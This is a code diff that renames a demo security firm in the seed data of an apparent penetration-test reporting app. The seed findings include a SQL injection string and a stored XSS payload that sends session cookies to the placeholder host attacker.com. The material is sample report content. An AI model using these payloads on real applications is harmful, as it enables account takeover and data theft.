@@ -14,19 +14,19 @@ export default function SeedPage() {
 
   useEffect(() => {
     try {
-      const spId = 'sp_okaxis_demo';
+      const spId = 'sp_oknexus_demo';
 
       // ── Engineers ──────────────────────────────────────────────────────────
       const engineers = [
-        { id: 'eng_arjun', name: 'Arjun Sharma', email: 'arjun.sharma@okaxis.io', role: 'Lead Security Engineer' },
-        { id: 'eng_priya', name: 'Priya Nair', email: 'priya.nair@okaxis.io', role: 'Senior Penetration Tester' },
-        { id: 'eng_rohan', name: 'Rohan Mehta', email: 'rohan.mehta@okaxis.io', role: 'Cloud Security Specialist' },
-        { id: 'eng_ananya', name: 'Ananya Iyer', email: 'ananya.iyer@okaxis.io', role: 'Security Analyst' },
-        { id: 'eng_kiran', name: 'Kiran Desai', email: 'kiran.desai@okaxis.io', role: 'Penetration Tester' },
+        { id: 'eng_arjun', name: 'Arjun Sharma', email: 'arjun.sharma@oknexus.io', role: 'Lead Security Engineer' },
+        { id: 'eng_priya', name: 'Priya Nair', email: 'priya.nair@oknexus.io', role: 'Senior Penetration Tester' },
+        { id: 'eng_rohan', name: 'Rohan Mehta', email: 'rohan.mehta@oknexus.io', role: 'Cloud Security Specialist' },
+        { id: 'eng_ananya', name: 'Ananya Iyer', email: 'ananya.iyer@oknexus.io', role: 'Security Analyst' },
+        { id: 'eng_kiran', name: 'Kiran Desai', email: 'kiran.desai@oknexus.io', role: 'Penetration Tester' },
       ].map(e => ({ ...e, exposure: { vulnerabilityClasses: ['XSS','SQLi','IDOR','SSRF'], applicationTypes: ['Web','API','Mobile'], authModels: ['OAuth 2.0','JWT'], totalEngagements: 12, lastEngagementDate: d(10) }, createdAt: d(180), updatedAt: d(10) }));
 
       // ── Service Provider ──────────────────────────────────────────────────
-      const sp = { id: spId, companyName: 'OkAxis Security', contactEmail: 'hello@okaxis.io', website: 'https://okaxis.io', legalDisclaimer: 'This report is confidential and intended solely for the named recipient.', defaultSeverityModel: 'CVSS' as const, defaultRemediationTone: 'Balanced' as const, createdAt: d(365), updatedAt: d(1) };
+      const sp = { id: spId, companyName: 'OkNexus Security', contactEmail: 'hello@oknexus.io', website: 'https://oknexus.io', legalDisclaimer: 'This report is confidential and intended solely for the named recipient.', defaultSeverityModel: 'CVSS' as const, defaultRemediationTone: 'Balanced' as const, createdAt: d(365), updatedAt: d(1) };
 
       // ── Clients ───────────────────────────────────────────────────────────
       const clientFintech = { id: 'cl_fintech', companyName: 'ZestPay Financial', industry: 'FinTech', techStack: 'React, Node.js, PostgreSQL, AWS', description: 'A fast-growing B2B payments platform handling UPI and card transactions.', contactName: 'Vivek Bhatia', contactEmail: 'vivek@zestpay.in', riskTolerance: 'Low' as const, preferredReportDepth: 'Detailed' as const, createdAt: d(300), updatedAt: d(30) };
@@ -69,7 +69,7 @@ export default function SeedPage() {
           primaryFont: 'Inter', secondaryFont: 'Roboto',
           logoPlacement: 'cover-and-header',
           useEnhancedCover: true, showChartsInExecutiveSummary: true, showRiskMatrix: true,
-          footerText: 'Confidential — OkAxis Security',
+          footerText: 'Confidential — OkNexus Security',
           confidentialityNotice: 'This document contains confidential security assessment information. Unauthorized disclosure is prohibited.',
         },
         visualStyle: { fontFamily: 'inter', spacingDensity: 'comfortable', pageSize: 'A4', showPageNumbers: true, showHeaderFooter: true, headingScale: 'comfortable' },
@@ -99,7 +99,7 @@ export default function SeedPage() {
           findings: [
             mkFinding({ title: 'SQL Injection in Merchant Search Filter', severity: 'Critical', category: 'Injection', description: 'The `q` parameter in `/api/merchants/search` is directly concatenated into a PostgreSQL query without parameterization, allowing full database read access.', impact: 'An attacker can exfiltrate all merchant PII, transaction records, and API keys stored in the database.', remediation: 'Use parameterized queries or an ORM. Validate and sanitize all user inputs before database interaction.', stepsToReproduce: "1. Login as any merchant\n2. Navigate to /search\n3. Enter `' OR '1'='1` in the search field\n4. Observe all merchants returned", cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H', baseScore: 9.9 }, affectedAssets: ['merchant.zestpay.in/api/merchants/search'], attackSurface: 'Web', cweIds: ['CWE-89'], owaspCategories: ['A03:2021 - Injection'], status: 'Resolved' }),
             mkFinding({ title: 'Broken Object Level Authorization (IDOR) in Transaction API', severity: 'High', category: 'Access Control', description: 'The `/api/transactions/:id` endpoint does not verify the requesting merchant owns the transaction. Any authenticated merchant can access any transaction by enumerating numeric IDs.', impact: 'Full read access to competitor transaction data including amounts, buyer details, and payment methods.', remediation: 'Implement server-side ownership checks. Use UUIDs instead of sequential integer IDs.', stepsToReproduce: "1. Create a transaction as Merchant A (e.g. txn_id=1001)\n2. Login as Merchant B\n3. GET /api/transactions/1001 — observe successful response with Merchant A's data", cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N', baseScore: 6.5 }, affectedAssets: ['api/transactions/:id'], attackSurface: 'API', cweIds: ['CWE-639'], owaspCategories: ['A01:2021 - Broken Access Control'], status: 'In Progress' }),
-            mkFinding({ title: 'Stored XSS in Business Name Field', severity: 'High', category: 'XSS', description: 'The merchant business name is reflected in the admin dashboard without HTML encoding, allowing stored XSS.', impact: 'Account takeover of OkAxis admin users who view merchant listings.', remediation: 'Apply context-aware output encoding. Use Content Security Policy headers.', stepsToReproduce: "1. Register merchant with name: <script>fetch('https://attacker.com?c='+document.cookie)</script>\n2. Login as admin and view merchant list", cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N', baseScore: 8.7 }, affectedAssets: ['admin.zestpay.in/merchants'], attackSurface: 'Web', cweIds: ['CWE-79'], owaspCategories: ['A03:2021 - Injection'] }),
+            mkFinding({ title: 'Stored XSS in Business Name Field', severity: 'High', category: 'XSS', description: 'The merchant business name is reflected in the admin dashboard without HTML encoding, allowing stored XSS.', impact: 'Account takeover of OkNexus admin users who view merchant listings.', remediation: 'Apply context-aware output encoding. Use Content Security Policy headers.', stepsToReproduce: "1. Register merchant with name: <script>fetch('https://attacker.com?c='+document.cookie)</script>\n2. Login as admin and view merchant list", cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N', baseScore: 8.7 }, affectedAssets: ['admin.zestpay.in/merchants'], attackSurface: 'Web', cweIds: ['CWE-79'], owaspCategories: ['A03:2021 - Injection'] }),
             mkFinding({ title: 'Missing Rate Limiting on OTP Endpoint', severity: 'Medium', category: 'Authentication', description: 'The `/auth/otp/verify` endpoint has no rate limiting or account lockout allowing brute-force of 6-digit OTPs.', impact: 'Attacker can brute-force the OTP within ~30 minutes to take over any account.', remediation: 'Implement rate limiting (max 5 attempts), CAPTCHA, and exponential backoff.', cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N', baseScore: 9.1 }, affectedAssets: ['/auth/otp/verify'], attackSurface: 'API', cweIds: ['CWE-307'] }),
             mkFinding({ title: 'Sensitive Data in HTTP Response Headers', severity: 'Low', category: 'Information Disclosure', description: 'Server responses expose `X-Powered-By: Express 4.18.2` and `Server: nginx/1.22.0` headers.', impact: 'Aids attacker reconnaissance by revealing exact technology versions.', remediation: 'Remove or mask Server and X-Powered-By headers in nginx config and Express settings.', cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N', baseScore: 5.3 }, status: 'Resolved' }),
           ],
